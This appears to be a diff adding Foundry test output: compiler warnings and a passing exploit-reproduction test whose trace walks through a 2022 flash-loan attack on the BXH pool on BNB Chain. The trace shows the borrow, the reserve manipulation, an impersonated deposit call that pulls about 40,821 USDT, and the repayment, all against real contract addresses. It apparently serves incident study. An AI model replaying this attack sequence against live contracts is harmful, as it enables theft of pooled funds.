@@ -1,0 +1,215 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.23s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 256.45ms (180.86µs CPU time)
+
+Ran 1 test for src/test/2022-09/BXH_exp.sol:Attacker
+[PASS] testExploit() (gas: 405960)
+Logs:
+  [Start] BXH-USDT  Pair USDT Balance is :: 25147.468936549224419158
+  [Flashloan] received
+  [Flashloan] now Hacker BXH balance is :: 148861.981685343581363723
+  [Flashloan] now bxh contract USDT balance is :: 40836.379864906450436248
+  [Flashloan] Hacker USDT Balance is :: 40821.040948267171511016
+  [Flashloan] bxh contract USDT Balance is :: 15.338916639278925232
+  [Flashloan] Hacker USDT Balance is :: 3218702.774825529910277592
+  [Over] Hacker USDT Balance is :: 31637.894825529910277592
+
+Traces:
+  [476860] Attacker::testExploit()
+    ├─ [2531] USDT::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   └─ ← [Return] 25147468936549224419158 [2.514e22]
+    ├─ emit log_named_decimal_uint(key: "[Start] BXH-USDT  Pair USDT Balance is :", val: 25147468936549224419158 [2.514e22], decimals: 18)
+    ├─ [462777] usdt/wbnb Pair::swap(3178800000000000000000000 [3.178e24], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x3078)
+    │   ├─ [29971] USDT::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3178800000000000000000000 [3.178e24])
+    │   │   ├─ emit Transfer(from: usdt/wbnb Pair: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3178800000000000000000000 [3.178e24])
+    │   │   └─ ← [Return] true
+    │   ├─ [401870] Attacker::pancakeCall(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3178800000000000000000000 [3.178e24], 0, 0x3078)
+    │   │   ├─ [0] console::log("[Flashloan] received") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [24562] USDT::approve(BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 3178800000000000000000000 [3.178e24]
+    │   │   ├─ [92893] BXH Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(3177994385129417587875382 [3.177e24], 1, [0x55d398326f99059fF775485246999027B3197955, 0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1664374995 [1.664e9])
+    │   │   │   ├─ [8834] USDT::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], 3177994385129417587875382 [3.177e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], value: 3177994385129417587875382 [3.177e24])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], value: 115792089237316195423570985008687907853269984665640560861463198878495541764553 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2556] BXH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2517] bxh/usdt Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 25147468936549224419158 [2.514e22], 150042582869434191452532 [1.5e23], 1664360756 [1.664e9]
+    │   │   │   ├─ [531] USDT::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3203141854065966812294540 [3.203e24]
+    │   │   │   ├─ [65339] bxh/usdt Pair::swap(0, 148861981685343581363723 [1.488e23], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [32556] BXH::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 148861981685343581363723 [1.488e23])
+    │   │   │   │   │   ├─ emit Transfer(from: bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 148861981685343581363723 [1.488e23])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3203141854065966812294540 [3.203e24]
+    │   │   │   │   ├─ [556] BXH::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1180601184090610088809 [1.18e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 3203141854065966812294540 [3.203e24], reserve1: 1180601184090610088809 [1.18e21])
+    │   │   │   │   ├─ emit Swap(sender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], amount0In: 3177994385129417587875382 [3.177e24], amount1In: 0, amount0Out: 0, amount1Out: 148861981685343581363723 [1.488e23], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [556] BXH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 148861981685343581363723 [1.488e23]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [556] BXH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 148861981685343581363723 [1.488e23]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] now Hacker BXH balance is :", val: 148861981685343581363723 [1.488e23], decimals: 18)
+    │   │   ├─ [8071] USDT::transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 805614870582412124618 [8.056e20])
+    │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, value: 805614870582412124618 [8.056e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] USDT::balanceOf(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663) [staticcall]
+    │   │   │   └─ ← [Return] 40836379864906450436248 [4.083e22]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] now bxh contract USDT balance is :", val: 40836379864906450436248 [4.083e22], decimals: 18)
+    │   │   ├─ [0] VM::startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [155493] 0x27539B1DEe647b38e1B987c41C5336b1A8DcE663::deposit(0, 0)
+    │   │   │   ├─ [517] bxh/usdt Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 3203141854065966812294540 [3.203e24], 1180601184090610088809 [1.18e21], 1664374995 [1.664e9]
+    │   │   │   ├─ [449] bxh/usdt Pair::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   ├─ [25171] USDT::transfer(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f, 40821040948267171511016 [4.082e22])
+    │   │   │   │   ├─ emit Transfer(from: 0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, to: 0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f, value: 40821040948267171511016 [4.082e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Deposit(user: 0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f, pid: 0, amount: 0)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT::balanceOf(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f) [staticcall]
+    │   │   │   └─ ← [Return] 40821040948267171511016 [4.082e22]
+    │   │   ├─ [23171] USDT::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40821040948267171511016 [4.082e22])
+    │   │   │   ├─ emit Transfer(from: 0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 40821040948267171511016 [4.082e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [0] VM::stopPrank()
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 40821040948267171511016 [4.082e22]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] Hacker USDT Balance is :", val: 40821040948267171511016 [4.082e22], decimals: 18)
+    │   │   ├─ [531] USDT::balanceOf(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663) [staticcall]
+    │   │   │   └─ ← [Return] 15338916639278925232 [1.533e19]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] bxh contract USDT Balance is :", val: 15338916639278925232 [1.533e19], decimals: 18)
+    │   │   ├─ [24608] BXH::approve(BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [556] BXH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 148861981685343581363723 [1.488e23]
+    │   │   ├─ [33050] BXH Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(148861981685343581363723 [1.488e23], 1, [0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3, 0x55d398326f99059fF775485246999027B3197955], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1664374995 [1.664e9])
+    │   │   │   ├─ [6611] BXH::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], 148861981685343581363723 [1.488e23])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], value: 148861981685343581363723 [1.488e23])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], value: 115792089237316195423570985008687907853269984665640563890595602322569548276212 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 40821040948267171511016 [4.082e22]
+    │   │   │   ├─ [517] bxh/usdt Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 3203141854065966812294540 [3.203e24], 1180601184090610088809 [1.18e21], 1664374995 [1.664e9]
+    │   │   │   ├─ [556] BXH::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 150042582869434191452532 [1.5e23]
+    │   │   │   ├─ [16694] bxh/usdt Pair::swap(3177881733877262738766576 [3.177e24], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [3271] USDT::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3177881733877262738766576 [3.177e24])
+    │   │   │   │   │   ├─ emit Transfer(from: bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3177881733877262738766576 [3.177e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 25260120188704073527964 [2.526e22]
+    │   │   │   │   ├─ [556] BXH::balanceOf(bxh/usdt Pair: [0x919964B7f12A742E3D33176D7aF9094EA4152e6f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 150042582869434191452532 [1.5e23]
+    │   │   │   │   ├─ emit Sync(reserve0: 25260120188704073527964 [2.526e22], reserve1: 150042582869434191452532 [1.5e23])
+    │   │   │   │   ├─ emit Swap(sender: BXH Router: [0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01], amount0In: 0, amount1In: 148861981685343581363723 [1.488e23], amount0Out: 3177881733877262738766576 [3.177e24], amount1Out: 0, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3218702774825529910277592 [3.218e24]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 3218702774825529910277592 [3.218e24]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] Hacker USDT Balance is :", val: 3218702774825529910277592 [3.218e24], decimals: 18)
+    │   │   ├─ [3271] USDT::transfer(usdt/wbnb Pair: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], 3187064880000000000000000 [3.187e24])
+    │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: usdt/wbnb Pair: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], value: 3187064880000000000000000 [3.187e24])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] USDT::balanceOf(usdt/wbnb Pair: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 75174106377605539489916570 [7.517e25]
+    │   ├─ [2534] WBNB::balanceOf(usdt/wbnb Pair: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 274482164770442978068531 [2.744e23]
+    │   ├─ emit Sync(reserve0: 75174106377605539489916570 [7.517e25], reserve1: 274482164770442978068531 [2.744e23])
+    │   ├─ emit Swap(sender: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 3187064880000000000000000 [3.187e24], amount1In: 0, amount0Out: 3178800000000000000000000 [3.178e24], amount1Out: 0, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop] 
+    ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 31637894825529910277592 [3.163e22]
+    ├─ emit log_named_decimal_uint(key: "[Over] Hacker USDT Balance is :", val: 31637894825529910277592 [3.163e22], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.37s (3.04s CPU time)
+
+Ran 2 test suites in 3.38s (3.63s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
